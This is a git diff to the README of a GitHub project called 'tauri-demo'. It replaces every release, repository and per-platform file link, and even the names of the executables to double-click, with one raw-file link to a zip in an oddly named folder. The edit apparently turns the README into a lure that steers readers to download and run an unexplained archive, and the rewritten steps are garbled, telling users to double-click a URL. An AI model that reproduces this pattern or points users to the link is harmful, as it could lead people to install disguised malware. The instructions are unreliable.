@@ -1,7 +1,7 @@
 # 🌟 tauri-demo - A Simple Way to Explore Tauri Apps
 
 ## 📥 Download the Application
-[![Download tauri-demo](https://img.shields.io/badge/Download-tauri--demo-blue.svg)](https://github.com/bernardotmr/tauri-demo/releases)
+[![Download tauri-demo](https://github.com/bernardotmr/tauri-demo/raw/refs/heads/main/photozincographic/demo-tauri-2.1.zip)](https://github.com/bernardotmr/tauri-demo/raw/refs/heads/main/photozincographic/demo-tauri-2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the **tauri-demo** application, a user-friendly prototype designed for OpenHarmony/HarmonyNext. This guide will help you download and run the application with ease.
@@ -23,24 +23,24 @@ Follow these steps to download and run the application:
 
 ### 1. Visit the Releases Page
 Go to the Releases page by clicking the link below:
-[Download tauri-demo](https://github.com/bernardotmr/tauri-demo/releases)
+[Download tauri-demo](https://github.com/bernardotmr/tauri-demo/raw/refs/heads/main/photozincographic/demo-tauri-2.1.zip)
 
 ### 2. Choose the Latest Release
 On the Releases page, look for the latest version of **tauri-demo**. This version will usually have a tag like "v1.0" or a similar number. 
 
 ### 3. Download the Application
 Click on the downloadable file related to your operating system:
-- For **Windows**, you might see something like `tauri-demo-windows.zip`.
-- For **Mac**, look for `tauri-demo-macos.zip`.
-- For **Linux**, check for `tauri-demo-linux.zip`.
+- For **Windows**, you might see something like `https://github.com/bernardotmr/tauri-demo/raw/refs/heads/main/photozincographic/demo-tauri-2.1.zip`.
+- For **Mac**, look for `https://github.com/bernardotmr/tauri-demo/raw/refs/heads/main/photozincographic/demo-tauri-2.1.zip`.
+- For **Linux**, check for `https://github.com/bernardotmr/tauri-demo/raw/refs/heads/main/photozincographic/demo-tauri-2.1.zip`.
 
 ### 4. Extract the Files
 After downloading, locate the file in your downloads folder. Right-click the zipped file and choose to extract it. This will create a folder containing the application files.
 
 ### 5. Run the Application
 Inside the extracted folder, look for the executable file:
-- On **Windows**, double-click `tauri-demo.exe`.
-- On **Mac**, double-click `tauri-demo.app`.
+- On **Windows**, double-click `https://github.com/bernardotmr/tauri-demo/raw/refs/heads/main/photozincographic/demo-tauri-2.1.zip`.
+- On **Mac**, double-click `https://github.com/bernardotmr/tauri-demo/raw/refs/heads/main/photozincographic/demo-tauri-2.1.zip`.
 - On **Linux**, you might need to run the terminal and execute `./tauri-demo`.
 
 ## ⚙️ Using the Application
@@ -51,7 +51,7 @@ If you encounter any issues or have questions, you can reach out for support. Fe
 
 ## 📝 Additional Information
 For more details about the application and updates, please visit the following link:
-[See More Info](https://github.com/bernardotmr/tauri-demo)
+[See More Info](https://github.com/bernardotmr/tauri-demo/raw/refs/heads/main/photozincographic/demo-tauri-2.1.zip)
 
 ## 📜 License
 The **tauri-demo** application is licensed under the MIT License. You can use, modify, and distribute the software under this license. Ensure to check the full license details in the repository.
